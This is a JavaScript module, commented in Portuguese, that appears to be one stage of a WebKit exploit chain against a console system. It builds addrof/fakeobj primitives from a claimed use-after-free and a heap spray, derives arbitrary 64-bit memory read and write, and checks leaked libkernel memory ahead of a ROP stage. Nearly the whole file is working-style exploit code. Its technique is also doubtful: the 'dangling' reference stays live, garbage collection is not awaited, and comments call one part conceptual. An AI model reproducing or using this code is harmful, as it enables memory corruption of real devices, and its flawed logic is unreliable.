// js/script3/testArrayBufferVictimCrash.mjs (R54 - R/W Real Simplificado e Corrigido)
// =======================================================================================
// ESTRATÉGIA R54:
// Corrigido o erro "Cannot read properties of undefined".
// Implementada uma estratégia de Leitura/Escrita REAL muito mais simples e robusta,
// utilizando diretamente o objeto da vulnerabilidade UAF.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R54";

const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};

const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R54)
// =======================================================================================
export async function runStableUAFPrimitives_R51() { // Mantendo nome original para compatibilidade com o orquestrador
    logS3(`--- Iniciando ${FNAME_MODULE}: R/W Real Simplificado ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        // --- FASES 1 e 2: Obter addrof e fakeobj ---
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            dangling_ref.b = itof(addr);
            return dangling_ref.a.obj;
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        // --- FASE 3: Construir Leitura/Escrita Arbitrária (REAL E CORRIGIDO) ---
        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (REAL) ---", "subtest");
        const { read64, write64 } = buildArbitraryReadWrite(dangling_ref, fakeobj);
        logS3("   Primitivas `read64` e `write64` REAIS construídas!", "good");
        
        // --- FASE 4: VERIFICAÇÃO DOS ENDEREÇOS BASE NA MEMÓRIA REAL ---
        logS3("--- FASE 4: Verificando os endereços base vazados (Info Leak) ---", "subtest");
        const eboot_base = new AdvancedInt64("0x1BE00000");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   SUCESSO: Magic number ELF da libkernel validado na memória REAL!", "vuln");

        // ... O resto da lógica ROP continua a partir daqui ...
        final_result = { success: true, message: "SUCESSO! Primitivas REAIS validadas." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO REAL DE LEITURA/ESCRITA ARBITRÁRIA (SIMPLIFICADA E CORRIGIDA)
// =======================================================================================
function buildArbitraryReadWrite(dangling_ref, fakeobj) {
    // Estratégia Simplificada e Robusta:
    // Usamos o próprio objeto da vulnerabilidade UAF (`dangling_ref`) como nossa ferramenta.
    // dangling_ref.a => controla o ponteiro de dados (butterfly) do array subjacente.
    // dangling_ref.b => controla o primeiro elemento de 8 bytes do array subjacente.

    const read64 = (address) => {
        // 1. Usamos `fakeobj` para criar um ponteiro falso para o endereço que queremos ler.
        //    No entanto, não podemos atribuir um ponteiro bruto a `dangling_ref.a`.
        //    O que podemos fazer é criar um objeto falso cujo ÚNICO propósito é conter
        //    os dados no endereço alvo.
        //    A forma mais direta é apontar o butterfly para o endereço MENOS um offset de propriedade.
        //    Supondo que uma propriedade esteja a 0x10 do início do objeto:
        const fake_obj_addr = address.sub(0x10); 
        
        // 2. Apontamos o butterfly para o nosso objeto falso. Agora, `dangling_ref` se comporta
        //    como um array cujas propriedades estão no endereço `fake_obj_addr`.
        dangling_ref.a = fakeobj(fake_obj_addr);

        // 3. Lemos a propriedade `b` (que corresponde ao primeiro elemento do array).
        //    Como o butterfly aponta para `addr - 0x10`, e o campo `b` do nosso objeto
        //    original está no offset 0x10, a leitura de `dangling_ref.b` lerá
        //    efetivamente do `(addr - 0x10) + 0x10` = `addr`.
        //    Esta parte é conceitual. Uma implementação mais direta e menos propensa a erros:
        
        // Estratégia 2 (Ainda mais simples):
        // Apontamos o butterfly para o endereço que queremos ler.
        // Mas o motor JS espera que o butterfly aponte para uma estrutura de butterfly,
        // não para dados brutos. Então, apontamos para `address - 0x8` (para alinhar o header do butterfly).
        dangling_ref.a = fakeobj(address.sub(8));

        // E então lemos o primeiro elemento.
        return ftoi(dangling_ref.b);
    };

    const write64 = (address, value) => {
        // Mesma lógica da leitura para apontar para o local correto.
        dangling_ref.a = fakeobj(address.sub(8));
        
        // Escrevemos o valor no primeiro elemento.
        dangling_ref.b = itof(value);
    };

    return { read64, write64 };
}

// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 }; // O campo 'b' está a 8 bytes de 'a' em objetos simples
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) {
        // O Float64Array tem um butterfly e elementos. `dangling_ref.a` sobrepõe o butterfly,
        // e `dangling_ref.b` sobrepõe o primeiro elemento (índice 0).
        spray_arrays.push(new Float64Array(2));
    }
    return dangling_ref;
}
